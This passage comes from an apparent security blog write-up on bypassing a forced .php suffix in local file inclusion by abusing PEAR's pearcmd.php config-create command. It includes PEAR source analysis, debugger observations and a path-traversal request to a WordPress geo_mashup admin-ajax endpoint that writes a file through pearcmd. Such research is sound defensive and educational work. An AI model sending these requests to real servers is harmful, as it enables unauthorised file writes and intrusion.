src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png&#39; alt=&#34;doc-config&#34; height=&#34;387&#34; width=&#34;608&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Description of config-create&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;When I tried running the command on CLI:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create&#xA;config-create: must have 2 parameters, root path and filename to save as&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When not enough parameters are provided, the program errors and requires two mandatory parameters:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;root path&lt;/code&gt;: the root directory PEAR uses for package installation and configuration lookup.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;filename&lt;/code&gt;: the filename to save the configuration as.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Trying with parameters:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php&#xA;Root directory must be an absolute path beginning with &amp;#34;/&amp;#34;, was: &amp;#34;test_root_path&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here PEAR insists &lt;code&gt;test_root_path&lt;/code&gt; must be an absolute path starting with &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Running again with a valid path:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The returned output:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Configuration (channel pear.php.net):&#xA;=====================================&#xA;Auto-discover new Channels     auto_discover    &amp;lt;not set&amp;gt;&#xA;Default Channel                default_channel  pear.php.net&#xA;HTTP Proxy Server Address      http_proxy       &amp;lt;not set&amp;gt;&#xA;PEAR server [DEPRECATED]       master_server    &amp;lt;not set&amp;gt;&#xA;Default Channel Mirror         preferred_mirror &amp;lt;not set&amp;gt;&#xA;Remote Configuration File      remote_config    &amp;lt;not set&amp;gt;&#xA;PEAR executables directory     bin_dir          /test_root_path/pear&#xA;PEAR documentation directory   doc_dir          /test_root_path/pear/docs&#xA;PHP extension directory        ext_dir          /test_root_path/pear/ext&#xA;PEAR directory                 php_dir          /test_root_path/pear/php&#xA;PEAR Installer cache directory cache_dir        /test_root_path/pear/cache&#xA;PEAR configuration file        cfg_dir          /test_root_path/pear/cfg&#xA;directory&#xA;PEAR data directory            data_dir         /test_root_path/pear/data&#xA;PEAR Installer download        download_dir     /test_root_path/pear/download&#xA;directory&#xA;Systems manpage files          man_dir          /test_root_path/pear/man&#xA;directory&#xA;PEAR metadata directory        metadata_dir     &amp;lt;not set&amp;gt;&#xA;PHP CLI/CGI binary             php_bin          &amp;lt;not set&amp;gt;&#xA;php.ini location               php_ini          &amp;lt;not set&amp;gt;&#xA;--program-prefix passed to     php_prefix       &amp;lt;not set&amp;gt;&#xA;PHP&amp;#39;s ./configure&#xA;--program-suffix passed to     php_suffix       &amp;lt;not set&amp;gt;&#xA;PHP&amp;#39;s ./configure&#xA;PEAR Installer temp directory  temp_dir         /test_root_path/pear/temp&#xA;PEAR test directory            test_dir         /test_root_path/pear/tests&#xA;PEAR www files directory       www_dir          /test_root_path/pear/www&#xA;Cache TimeToLive               cache_ttl        &amp;lt;not set&amp;gt;&#xA;Preferred Package State        preferred_state  &amp;lt;not set&amp;gt;&#xA;Unix file mask                 umask            &amp;lt;not set&amp;gt;&#xA;Debug Log Level                verbose          &amp;lt;not set&amp;gt;&#xA;PEAR password (for             password         &amp;lt;not set&amp;gt;&#xA;maintainers)&#xA;Signature Handling Program     sig_bin          &amp;lt;not set&amp;gt;&#xA;Signature Key Directory        sig_keydir       &amp;lt;not set&amp;gt;&#xA;Signature Key Id               sig_keyid        &amp;lt;not set&amp;gt;&#xA;Package Signature Type         sig_type         &amp;lt;not set&amp;gt;&#xA;PEAR username (for             username         &amp;lt;not set&amp;gt;&#xA;maintainers)&#xA;User Configuration File        Filename         /var/www/html/test_filename.php&#xA;System Configuration File      Filename         #no#system#config#&#xA;Successfully created default configuration file &amp;#34;/usr/www/html/test_filename.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The result shows child paths for each type of data being auto-generated under &lt;code&gt;/test_root_path/pear&lt;/code&gt;. On the last line:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Successfully created default configuration file &amp;#34;/usr/www/html/test_filename.php&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The configuration file was created in the current working directory, not under &lt;code&gt;root_path&lt;/code&gt;. This is PEAR&amp;rsquo;s default behavior: &lt;code&gt;root_path&lt;/code&gt; only affects the layout of install directories, not the location of the saved config file.&lt;/p&gt;&#xA;&lt;p&gt;When accessing the file &lt;code&gt;&amp;quot;/var/www/html/test_filename.php&amp;quot;&lt;/code&gt; via a browser:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#34; title=&#34;Contents of test_filename.php rendered in the browser&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#34; data-sub-html=&#34;&lt;h2&gt;file-create&lt;/h2&gt;&lt;p&gt;Contents of test_filename.php rendered in the browser&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png&#39; alt=&#34;file-create&#34; height=&#34;137&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Contents of test_filename.php rendered in the browser&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The created file contains information about &lt;code&gt;test_root_path&lt;/code&gt;, presented in &lt;code&gt;serialize&lt;/code&gt; format.&lt;/p&gt;&#xA;&lt;p&gt;However, that was the CLI execution path. For web exploitation, one must analyze the source to see how the program accepts and processes parameters passed in.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;pearcmd-code-analysis&#34;&gt;&lt;span&gt;&lt;code&gt;pearcmd&lt;/code&gt; Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#pearcmd-code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Before analyzing &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt;, it&amp;rsquo;s useful to set up a debugging environment to observe execution flow — see: &lt;a href=&#34;https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Then copy all PHP source from the container to a local machine, preserving directory structure, so when the debugger stops at &lt;code&gt;/usr/local/lib/php/pearcmd.php&lt;/code&gt; you can open and inspect the corresponding file from the container:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;require_once &amp;#39;PEAR.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Frontend.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Config.php&amp;#39;;&#xA;require_once &amp;#39;PEAR/Command.php&amp;#39;;&#xA;require_once &amp;#39;Console/Getopt.php&amp;#39;;&#xA;&#xA;$all_commands = PEAR_Command::getCommands();&#xA;...&#xA;$argv = Console_Getopt::readPHPArgv();&#xA;...&#xA;$options = Console_Getopt::getopt2($argv, &amp;#34;c:C:d:D:Gh?sSqu:vV&amp;#34;);&#xA;array_shift($argv);&#xA;...&#xA;$command = (isset($options[1][0])) ? $options[1][0] : null;&#xA;...&#xA;if ($fetype == &amp;#39;Gtk2&amp;#39;) {&#xA;    ...&#xA;} else {&#xA;    do {&#xA;        ...&#xA;        $cmd = PEAR_Command::factory($command, $config);&#xA;        ...&#xA;        list($tmpopt, $params) = $tmp;&#xA;        ...&#xA;        $ok = $cmd-&amp;gt;run($command, $opts, $params);&#xA;        if ($ok === false) {&#xA;            PEAR::raiseError(&amp;#34;unknown command `$command&amp;#39;&amp;#34;);&#xA;        }&#xA;        ...&#xA;    } while (false);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;First, all commands are loaded into &lt;code&gt;$all_commands&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$all_commands = PEAR_Command::getCommands();&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function getCommands()&#xA;{&#xA;    if (empty($GLOBALS[&amp;#39;_PEAR_Command_commandlist&amp;#39;])) {&#xA;        PEAR_Command::registerCommands();&#xA;    }&#xA;    return $GLOBALS[&amp;#39;_PEAR_Command_commandlist&amp;#39;];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;getCommands()&lt;/code&gt; calls &lt;code&gt;registerCommands()&lt;/code&gt; to register the commands.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#34; title=&#34;All commands are loaded into `$all_commands`&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#34; data-sub-html=&#34;&lt;h2&gt;all_commands&lt;/h2&gt;&lt;p&gt;All commands are loaded into `$all_commands`&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png&#39; alt=&#34;all\_commands&#34; height=&#34;390&#34; width=&#34;362&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;All commands are loaded into `$all_commands`&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Then &lt;code&gt;$argv&lt;/code&gt; is initialized:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$argv = Console_Getopt::readPHPArgv();&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;public static function readPHPArgv()&#xA;{&#xA;    global $argv;&#xA;    if (!is_array($argv)) {&#xA;        if (!@is_array($_SERVER[&amp;#39;argv&amp;#39;])) {&#xA;            if (!@is_array($GLOBALS[&amp;#39;HTTP_SERVER_VARS&amp;#39;][&amp;#39;argv&amp;#39;])) {&#xA;                $msg = &amp;#34;Could not read cmd args (register_argc_argv=Off?)&amp;#34;;&#xA;                return PEAR::raiseError(&amp;#34;Console_Getopt: &amp;#34; . $msg);&#xA;            }&#xA;            return $GLOBALS[&amp;#39;HTTP_SERVER_VARS&amp;#39;][&amp;#39;argv&amp;#39;];&#xA;        }&#xA;        return $_SERVER[&amp;#39;argv&amp;#39;];&#xA;    }&#xA;    return $argv;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If &lt;code&gt;$argv&lt;/code&gt; is not an array (i.e., no valid data), the function tries to find the equivalent in &lt;code&gt;$_SERVER[&#39;argv&#39;]&lt;/code&gt; and return it — that is, the &lt;code&gt;search-word&lt;/code&gt; parts we pass in the URL. Example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=geo_mashup_query&amp;amp;object_ids=2&amp;amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;amp;&amp;#43;config-create&amp;#43;/test_root_path&amp;#43;test_filename.php HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Observed in the debugger:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#34; title=&#34;Value of `$argv` in the debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#34; data-sub-html=&#34;&lt;h2&gt;argv1&lt;/h2&gt;&lt;p&gt;Value of `$argv` in the debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png&#39; alt=&#34;argv1&#34; height=&#34;156&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Value of `$argv` in the debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Next &lt;code&gt;$argv&lt;/code&gt; has its first element removed and is passed to &lt;code&gt;Console_Getopt::getopt2()&lt;/code&gt;, the return value assigned to &lt;code&gt;$options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;array_shift($argv);&#xA;$options = Console_Getopt::getopt2($argv, &amp;#34;c:C:d:D:Gh?sSqu:vV&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value is now:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#34; title=&#34;Values of `$argv` and `$options` in the debugger&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#34; data-sub-html=&#34;&lt;h2&gt;argv_options&lt;/h2&gt;&lt;p&gt;Values of `$argv` and `$options` in the debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png&#39; alt=&#34;argv\_options&#34; height=&#34;244&#34; width=&#34;1634&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Values of `$argv` and `$options` in the debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;$command&lt;/code&gt; variable is initialized from &lt;code&gt;$options[1][0]&lt;/code&gt;, in this case &lt;code&gt;config-create&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$command = (isset($options[1][0])) ? $options[1][0] : null;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then a factory is created and assigned to &lt;code&gt;$cmd&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$cmd = PEAR_Command::factory($command, $config);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hovering &lt;code&gt;$cmd&lt;/code&gt; shows the required parameters for the &lt;code&gt;config-create&lt;/code&gt; command.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#34; title=&#34;Required parameters for the `config-create` command&#34; data-thumbnail=&#34;/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#34; data-sub-html=&#34;&lt;h2&gt;doc&lt;/h2&gt;&lt;p&gt;Required parameters for the `config-create` command&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png&#39; alt=&#34;doc&#34; height=&#34;424&#34; width=&#34;861&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Required parameters for the `config-create` command&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Notably, the execution function for &lt;code&gt;config-create&lt;/code&gt; is &lt;code&gt;doConfigCreate&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function doConfigCreate($command, $options, $params)&#xA;{&#xA;    if (count($params) != 2) {&#xA;        return PEAR::raiseError(&amp;#39;config-create: must have 2 parameters, root path and &amp;#39; .&#xA;            &amp;#39;filename to save as&amp;#39;);&#xA;    }&#xA;&#xA;    $root = $params[0];&#xA;    // Clean up the DIRECTORY_SEPARATOR mess&#xA;    $ds2 = DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR;&#xA;    $root = preg_replace(array(&amp;#39;!\\\\&amp;#43;!&amp;#39;, &amp;#39;!/&amp;#43;!&amp;#39;, &amp;#34;!$ds2&amp;#43;!&amp;#34;),&#xA;                            array(&amp;#39;/&amp;#39;, &amp;#39;/&amp;#39;, &amp;#39;/&amp;#39;),&#xA;                        $root);&#xA;    if ($root[0] != &amp;#39;/&amp;#39;) {&#xA;        if (!isset($options[&amp;#39;windows&amp;#39;])) {&#xA;            return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;                &amp;#39;with &amp;#34;/&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;        }&#xA;&#xA;        if (!preg_match(&amp;#39;/^[A-Za-z]:/&amp;#39;, $root)) {&#xA;            return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;                &amp;#39;with &amp;#34;\\&amp;#34; or &amp;#34;C:\\&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;        }&#xA;    }&#xA;&#xA;    $windows = isset($options[&amp;#39;windows&amp;#39;]);&#xA;    if ($windows) {&#xA;        $root = str_replace(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, $root);&#xA;    }&#xA;&#xA;    if (!file_exists($params[1]) &amp;amp;&amp;amp; !@touch($params[1])) {&#xA;        return PEAR::raiseError(&amp;#39;Could not create &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;&#xA;    $params[1] = realpath($params[1]);&#xA;    $config = new PEAR_Config($params[1], &amp;#39;#no#system#config#&amp;#39;, false, false);&#xA;    if ($root[strlen($root) - 1] == &amp;#39;/&amp;#39;) {&#xA;        $root = substr($root, 0, strlen($root) - 1);&#xA;    }&#xA;&#xA;    $config-&amp;gt;noRegistry();&#xA;    $config-&amp;gt;set(&amp;#39;php_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\php&amp;#34; : &amp;#34;$root/pear/php&amp;#34;, &amp;#39;user&amp;#39;);&#xA;    $config-&amp;gt;set(&amp;#39;data_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\data&amp;#34; : &amp;#34;$root/pear/data&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;www_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\www&amp;#34; : &amp;#34;$root/pear/www&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;cfg_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\cfg&amp;#34; : &amp;#34;$root/pear/cfg&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;ext_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\ext&amp;#34; : &amp;#34;$root/pear/ext&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;doc_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\docs&amp;#34; : &amp;#34;$root/pear/docs&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;test_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\tests&amp;#34; : &amp;#34;$root/pear/tests&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;cache_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\cache&amp;#34; : &amp;#34;$root/pear/cache&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;download_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\download&amp;#34; : &amp;#34;$root/pear/download&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;temp_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\temp&amp;#34; : &amp;#34;$root/pear/temp&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;bin_dir&amp;#39;, $windows ? &amp;#34;$root\\pear&amp;#34; : &amp;#34;$root/pear&amp;#34;);&#xA;    $config-&amp;gt;set(&amp;#39;man_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\man&amp;#34; : &amp;#34;$root/pear/man&amp;#34;);&#xA;    $config-&amp;gt;writeConfigFile();&#xA;    $this-&amp;gt;_showConfig($config);&#xA;    $this-&amp;gt;ui-&amp;gt;outputData(&amp;#39;Successfully created default configuration file &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;,&#xA;        $command);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function requires exactly 2 parameters: &lt;code&gt;root path&lt;/code&gt; and &lt;code&gt;filename&lt;/code&gt;. If not, it errors.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (count($params) != 2) {&#xA;    return PEAR::raiseError(&amp;#39;config-create: must have 2 parameters, root path and &amp;#39; .&#xA;        &amp;#39;filename to save as&amp;#39;);&#xA;}&#xA;$root = $params[0];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the first character of the root path is not &lt;code&gt;/&lt;/code&gt;, the function checks whether the &lt;code&gt;windows&lt;/code&gt; option is set.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($root[0] != &amp;#39;/&amp;#39;) {&#xA;    if (!isset($options[&amp;#39;windows&amp;#39;])) {&#xA;        return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;            &amp;#39;with &amp;#34;/&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;&#xA;    if (!preg_match(&amp;#39;/^[A-Za-z]:/&amp;#39;, $root)) {&#xA;        return PEAR::raiseError(&amp;#39;Root directory must be an absolute path beginning &amp;#39; .&#xA;            &amp;#39;with &amp;#34;\\&amp;#34; or &amp;#34;C:\\&amp;#34;, was: &amp;#34;&amp;#39; . $root . &amp;#39;&amp;#34;&amp;#39;);&#xA;    }&#xA;}&#xA;$windows = isset($options[&amp;#39;windows&amp;#39;]);&#xA;if ($windows) {&#xA;    $root = str_replace(&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, $root);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If not Windows → error because the path must start with &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If Windows → verify &lt;code&gt;C:&lt;/code&gt; style path and convert &lt;code&gt;/&lt;/code&gt; to &lt;code&gt;\&lt;/code&gt; if needed.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Then it attempts to create and validate the output config file:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!file_exists($params[1]) &amp;amp;&amp;amp; !@touch($params[1])) {&#xA;    return PEAR::raiseError(&amp;#39;Could not create &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;);&#xA;}&#xA;$params[1] = realpath($params[1]);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;If the file doesn&amp;rsquo;t exist, it attempts &lt;code&gt;touch()&lt;/code&gt; to create it. If that fails → error.&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;realpath&lt;/code&gt; to obtain the absolute path.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Create a config object and normalize &lt;code&gt;$root&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config = new PEAR_Config($params[1], &amp;#39;#no#system#config#&amp;#39;, false, false);&#xA;if ($root[strlen($root) - 1] == &amp;#39;/&amp;#39;) {&#xA;    $root = substr($root, 0, strlen($root) - 1);&#xA;}&#xA;$config-&amp;gt;noRegistry();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Set directory values:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config-&amp;gt;set(&amp;#39;php_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\php&amp;#34; : &amp;#34;$root/pear/php&amp;#34;, &amp;#39;user&amp;#39;);&#xA;$config-&amp;gt;set(&amp;#39;data_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\data&amp;#34; : &amp;#34;$root/pear/data&amp;#34;);&#xA;...&#xA;$config-&amp;gt;set(&amp;#39;man_dir&amp;#39;, $windows ? &amp;#34;$root\\pear\\man&amp;#34; : &amp;#34;$root/pear/man&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally write the configuration file, display it, and report success:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$config-&amp;gt;writeConfigFile();&#xA;$this-&amp;gt;_showConfig($config);&#xA;$this-&amp;gt;ui-&amp;gt;outputData(&amp;#39;Successfully created default configuration file &amp;#34;&amp;#39; . $params[1] . &amp;#39;&amp;#34;&amp;#39;,&#xA;    $command);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;writeConfigFile()&lt;/code&gt; is the function responsible for writing the config file.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function writeConfigFile($file = null, $layer = &amp;#39;user&amp;#39;, $data = null)&#xA;{&#xA;    $this-&amp;gt;_lazyChannelSetup($layer);&#xA;    if ($layer == &amp;#39;both&amp;#39; || $layer == &amp;#39;all&amp;#39;) {&#xA;        foreach ($this-&amp;gt;files as $type =&amp;gt; $file) {&#xA;            $err = $this-&amp;gt;writeConfigFile($file, $type, $data);&#xA;            if (PEAR::isError($err)) {&#xA;                return $err;&#xA;            }&#xA;        }&#xA;        return true;&#xA;    }&#xA;&#xA;    if (empty($this-&amp;gt;files[$layer])) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;unknown config file type `$layer&amp;#39;&amp;#34;);&#xA;    }&#xA;&#xA;    if ($file === null) {&#xA;        $file = $this-&amp;gt;files[$layer];&#xA;    }&#xA;&#xA;    $data = ($data === null) ? $this-&amp;gt;configuration[$layer] : $data;&#xA;    $this-&amp;gt;_encodeOutput($data);&#xA;    $opt = array(&amp;#39;-p&amp;#39;, dirname($file));&#xA;    if (!@System::mkDir($opt)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;could not create directory: &amp;#34; . dirname($file));&#xA;    }&#xA;&#xA;    if (file_exists($file) &amp;amp;&amp;amp; is_file($file) &amp;amp;&amp;amp; !is_writeable($file)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;no write access to $file!&amp;#34;);&#xA;    }&#xA;&#xA;    $fp = @fopen($file, &amp;#34;w&amp;#34;);&#xA;    if (!$fp) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;PEAR_Config::writeConfigFile fopen(&amp;#39;$file&amp;#39;,&amp;#39;w&amp;#39;) failed ($php_errormsg)&amp;#34;);&#xA;    }&#xA;&#xA;    $contents = &amp;#34;#PEAR_Config 0.9\n&amp;#34; . serialize($data);&#xA;    if (!@fwrite($fp, $contents)) {&#xA;        return $this-&amp;gt;raiseError(&amp;#34;PEAR_Config::writeConfigFile: fwrite failed ($php_errormsg)&amp;#34;);&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function is the one that writes the config file by &lt;code&gt;serialize($data)&lt;/code&gt; to convert the configuration into a storable string.&lt;/p&gt;&#xA;&lt;p&gt;Back in &lt;code&gt;pearcmd.php&lt;/code&gt;, the params are prepared and assigned to 